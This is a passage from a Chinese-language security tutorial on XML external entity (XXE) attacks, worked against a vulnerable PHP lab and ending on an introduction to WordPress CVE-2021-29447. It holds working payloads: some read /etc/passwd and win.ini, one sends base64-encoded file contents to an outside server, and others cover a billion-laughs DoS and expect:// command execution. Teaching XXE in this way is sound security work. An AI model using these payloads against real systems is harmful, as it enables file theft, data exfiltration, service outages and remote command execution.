+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % 参数实体名 &quot;参数实体内容&quot;&gt;<br>%参数实体名;<br></code></pre></td></tr></table></figure>
+
+<h4 id="文本实体"><a href="#文本实体" class="headerlink" title="文本实体"></a>文本实体</h4><p>文本实体与通用实体类似，用于表示在XML文档中引用的文本片段。</p>
+<p>文本实体通过<code>&lt;!ENTITY&gt;</code>声明，通过<code>&amp;实体名;</code>来引用文本实体。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE 根元素名 [<br>    &lt;!ENTITY 实体名 &quot;实体内容&quot;&gt;<br>]&gt;<br>&lt;根元素名&gt;<br>    &amp;实体名;<br>&lt;/根元素名&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><p>不同语言支持的协议也不同：</p>
+<table>
+<thead>
+<tr>
+<th>libxml2</th>
+<th>PHP</th>
+<th>Java</th>
+<th>.NET</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>file</td>
+<td>file</td>
+<td>http</td>
+<td>file</td>
+</tr>
+<tr>
+<td>http</td>
+<td>http</td>
+<td>https</td>
+<td>http</td>
+</tr>
+<tr>
+<td>ftp</td>
+<td>ftp</td>
+<td>ftp</td>
+<td>https</td>
+</tr>
+<tr>
+<td></td>
+<td>compress.zlib</td>
+<td>file</td>
+<td>ftp</td>
+</tr>
+<tr>
+<td></td>
+<td>compress.bzip2</td>
+<td>jar</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>data</td>
+<td>netdoc</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>glob</td>
+<td>mailto</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>phar</td>
+<td>gopher</td>
+<td></td>
+</tr>
+</tbody></table>
+<h2 id="常用攻击方式"><a href="#常用攻击方式" class="headerlink" title="常用攻击方式"></a>常用攻击方式</h2><h3 id="通用实体-1"><a href="#通用实体-1" class="headerlink" title="通用实体"></a>通用实体</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY b <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">c</span>&gt;</span><span class="hljs-symbol">&amp;b;</span><span class="hljs-tag">&lt;/<span class="hljs-name">c</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="参数实体-dtd"><a href="#参数实体-dtd" class="headerlink" title="参数实体+dtd"></a>参数实体+dtd</h3><p>dtd:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<p>xml:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % d <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%d;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">c</span>&gt;</span><span class="hljs-symbol">&amp;b;</span><span class="hljs-tag">&lt;/<span class="hljs-name">c</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="通用实体-dtd"><a href="#通用实体-dtd" class="headerlink" title="通用实体+dtd"></a>通用实体+dtd</h3><p>dtd:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<p>xml:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">c</span>&gt;</span><span class="hljs-symbol">&amp;b;</span><span class="hljs-tag">&lt;/<span class="hljs-name">c</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这里直接在DOCTYPE声明中指定了一个外部DTD文件的URL，而没有定义额外的实体。XML解析器在解析DOCTYPE声明时就会直接加载外部DTD文件。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>借助XXE-LAB进行尝试，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* autor: c0ny1</span><br><span class="hljs-comment">* date: 2018-2-7</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-variable">$USERNAME</span> = <span class="hljs-string">&#x27;admin&#x27;</span>; <span class="hljs-comment">//账号</span><br><span class="hljs-variable">$PASSWORD</span> = <span class="hljs-string">&#x27;admin&#x27;</span>; <span class="hljs-comment">//密码</span><br><span class="hljs-variable">$result</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><span class="hljs-keyword">try</span>&#123;<br>	<span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>	<span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>	<span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br><br>	<span class="hljs-variable">$username</span> = <span class="hljs-variable">$creds</span>-&gt;username;<br>	<span class="hljs-variable">$password</span> = <span class="hljs-variable">$creds</span>-&gt;password;<br><br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-variable">$USERNAME</span> &amp;&amp; <span class="hljs-variable">$password</span> == <span class="hljs-variable">$PASSWORD</span>)&#123;<br>		<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-variable">$username</span>);<br>	&#125;<span class="hljs-keyword">else</span>&#123;<br>		<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$username</span>);<br>	&#125;	<br>&#125;<span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)&#123;<br>	<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">3</span>,<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>其中<code>libxml_disable_entity_loader(false);</code>没有禁止外部实体，存在xxe漏洞。</p>
+<h3 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h3><h4 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h4><p>正常请求如下：</p>
+<p><img src="/2023/04/27/file-upload/240514103454265.png" srcset="/img/loading.gif" lazyload alt="image-20240514103454265"></p>
+<p>注意content-type为application&#x2F;xml，并且在response中会把username(admin)进行回显，直接定义一个dtd，并且在username标签内引用：</p>
+<p><img src="/2023/04/27/file-upload/240514104833279.png" srcset="/img/loading.gif" lazyload alt="image-20240514104833279"></p>
+<p>payload如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">ry4n</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>&amp;ry4n;<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>但是如果有特殊字符，就会报错：</p>
+<p><img src="/2023/04/27/file-upload/240514110653779.png" srcset="/img/loading.gif" lazyload alt="image-20240514110653779"></p>
+<p>可以通过CDATA解决。</p>
+<h5 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h5><h6 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h6><p>CDATA（Character Data）可以用于包含不会被解析器处理的文本。可以将读取的文件内容封装在CDATA中，防止特殊字符被XML解析器误解。</p>
+<p>先给出payload。</p>
+<p>外部dtd如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;file:///d:/test.txt&quot;&gt;<br>&lt;!ENTITY % eval &quot;&lt;!ENTITY exfil &#x27;&lt;![CDATA[%file;]]&gt;&#x27;&gt;&quot;&gt;<br>%eval;<br></code></pre></td></tr></table></figure>
+
+<p>payload如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///path/to/xxe.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;exfil;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/04/27/file-upload/240514113010101.png" srcset="/img/loading.gif" lazyload alt="image-20240514113010101"></p>
+<p>报错：实体’&amp;;’被禁止。</p>
+<p>尝试更换payload：</p>
+<p>外部dtd:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; <br>&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">roottag</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">start</span> <span class="hljs-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span>   </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">goodies</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///d:/test.txt&quot;</span>&gt;</span>  </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">end</span> <span class="hljs-string">&quot;]]&gt;&quot;</span>&gt;</span>  </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://23.94.98.161/xxe.dtd&quot;</span>&gt;</span> </span><br><span class="hljs-meta">%dtd; ]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;all;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>成功读取：</p>
+<p><img src="/2023/04/27/file-upload/240514113857159.png" srcset="/img/loading.gif" lazyload alt="image-20240514113857159"></p>
+<p>第二种就是前面提到的参数实体+dtd的方式。</p>
+<p>在第一种方法中，<code>% eval;</code> 在内部子集中定义并引用一个参数实体 <code>%file;</code>，但是很多XML解析器不允许在内部子集中引用参数实体，导致报错 <code>PEReferences forbidden in internal subset</code>。</p>
+<p>而在第二种方法中，首先定义了几个参数实体 <code>%start;</code>、<code>%goodies;</code> 和 <code>%end;</code>。这些实体分别包含了CDATA的起始部分、从文件加载的内容，以及CDATA的结束部分。最后定义了一个外部DTD实体 <code>%dtd</code>，指向了远程的DTD文件 <code>http://ip/xxe.dtd</code>。而外部DTD文件 <code>xxe.dtd</code> 定义了一个 <code>all</code> 实体，它组合了内部子集中的 <code>start</code>、<code>goodies</code> 和 <code>end</code> 三个实体。当 <code>%dtd;</code> 被加载时，外部DTD文件的内容会被引入，使得 <code>&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</code> 被解析并生效。</p>
+<p>解析顺序如下：</p>
+<ol>
+<li><strong>解析内部子集</strong>：<ul>
+<li><code>&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</code></li>
+<li><code>&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</code></li>
+<li><code>&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</code></li>
+<li><code>&lt;!ENTITY % dtd SYSTEM &quot;http://23.94.98.161/xxe.dtd&quot;&gt;</code></li>
+</ul>
+</li>
+<li><strong>加载外部DTD文件</strong>：<ul>
+<li>解析器加载 <code>http://23.94.98.161/xxe.dtd</code>，该文件定义了 <code>&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</code>。</li>
+</ul>
+</li>
+<li><strong>解析主XML内容</strong>：<ul>
+<li><code>&lt;user&gt;&lt;username&gt;&amp;all;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</code></li>
+<li><code>&amp;all;</code> 被替换为 <code>%start;%goodies;%end;</code>。</li>
+<li><code>%start;</code> 被替换为 <code>&lt;![CDATA[</code>。</li>
+<li><code>%goodies;</code> 被替换为文件 <code>d:/test.txt</code> 的内容。</li>
+<li><code>%end;</code> 被替换为 <code>]]&gt;</code>。</li>
+<li>最终替换为 <code>&lt;![CDATA[ ... ]]&gt;</code>然后解析内部的参数实体，从而正确地包含文件内容。</li>
+</ul>
+</li>
+</ol>
+<h6 id="BASE64"><a href="#BASE64" class="headerlink" title="BASE64"></a>BASE64</h6><p>xml内容如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [<span class="hljs-meta">&lt;!ENTITY a <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=d:/test.txt&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;a;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>利用php伪协议即可。</p>
+<p><img src="/2023/04/27/file-upload/240514170545290.png" srcset="/img/loading.gif" lazyload alt="image-20240514170545290"></p>
+<p>解码结果为：<br><img src="/2023/04/27/file-upload/240514170601269.png" srcset="/img/loading.gif" lazyload alt="image-20240514170601269"></p>
+<h4 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h4><p>无回显的情况，可以将数据发送到vps上查看。</p>
+<p>dtd如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY % test<br>&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://192.168.122.111:9999/?%file;&#x27;&gt;&quot;&gt;<br>%test;<br></code></pre></td></tr></table></figure>
+
+<p>payload如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=c:/windows/win.ini&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://192.168.122.111/1.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%dtd;</span><br><span class="hljs-meta">%send;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/04/27/file-upload/240515105827333.png" srcset="/img/loading.gif" lazyload alt="image-20240515105827333"></p>
+<p>将结果解码即可：</p>
+<p><img src="/2023/04/27/file-upload/240515105850209.png" srcset="/img/loading.gif" lazyload alt="image-20240515105850209"></p>
+<p>dtd中定义了一个参数实体并对其进行引用，因为实体的值中不能有特殊字符，所以对其进行编码(%).在xml中，%dtd去访问外部dtd，dtd中引用%test，而test中定义了send，最终访问了vps，参数值即为file的内容，也就是win.ini的base64编码，通过web日志进行解码即可读取文件。</p>
+<h3 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h3><p>如果访问未开放端口：</p>
+<p><img src="/2023/04/27/file-upload/240515111055017.png" srcset="/img/loading.gif" lazyload alt="image-20240515111055017"></p>
+<p>如果端口开放，结果如下：</p>
+<p><img src="/2023/04/27/file-upload/240515111116572.png" srcset="/img/loading.gif" lazyload alt="image-20240515111116572"></p>
+<p>能够从response和响应时间判断端口开放情况。</p>
+<h3 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br>   <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">lolz</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol</span> <span class="hljs-string">&quot;lol&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol2</span> <span class="hljs-string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol3</span> <span class="hljs-string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol4</span> <span class="hljs-string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol5</span> <span class="hljs-string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol6</span> <span class="hljs-string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol7</span> <span class="hljs-string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol8</span> <span class="hljs-string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol9</span> <span class="hljs-string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">lolz</span>&gt;</span>&amp;lol9;<span class="hljs-tag">&lt;/<span class="hljs-name">lolz</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>如果开启了expect扩展，即可直接执行命令：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;expect://whoami&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="Wordpress-CVE-2021-29447"><a href="#Wordpress-CVE-2021-29447" class="headerlink" title="Wordpress: CVE-2021-29447"></a>Wordpress: CVE-2021-29447</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Wordpress is <span class="hljs-keyword">an</span> <span class="hljs-built_in">open</span> source CMS. A user <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> ability <span class="hljs-built_in">to</span> upload <span class="hljs-built_in">files</span> (like <span class="hljs-keyword">an</span> Author) can exploit <span class="hljs-keyword">an</span> XML parsing issue <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> Media Library leading <span class="hljs-built_in">to</span> XXE attacks. This requires WordPress installation <span class="hljs-built_in">to</span> be <span class="hljs-keyword">using</span> PHP <span class="hljs-number">8.</span> Access <span class="hljs-built_in">to</span> internal <span class="hljs-built_in">files</span> is possible <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span> successful XXE attack. This has been patched <span class="hljs-keyword">in</span> WordPress <span class="hljs-built_in">version</span> <span class="hljs-number">5.7</span><span class="hljs-number">.1</span>, along <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> older affected versions via <span class="hljs-keyword">a</span> minor release. We strongly recommend you keep auto-updates enabled.<br></code></pre></td></tr></table></figure>
+
+<p>WordPress使用了一个名为ID3的MP3解析库，该库受到XML外部实体（XXE）漏洞的影响。</p>
+<p>能够上传文件的用户（例如Author）可以利用媒体库中的XML解析漏洞来进行XXE攻击。</p>
